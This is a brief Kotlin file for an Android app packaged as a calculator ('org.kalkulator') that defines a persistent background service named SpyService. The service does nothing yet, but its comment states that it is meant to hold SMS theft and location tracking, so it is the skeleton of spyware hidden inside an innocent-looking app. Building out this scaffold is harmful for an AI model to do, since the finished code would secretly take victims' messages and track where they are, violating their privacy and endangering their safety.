package org.kalkulator

import android.app.Service
import android.content.Intent
import android.os.IBinder

class SpyService : Service() {
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // This is where background tasks (SMS theft, location tracking) will live
        return START_STICKY
    }
}
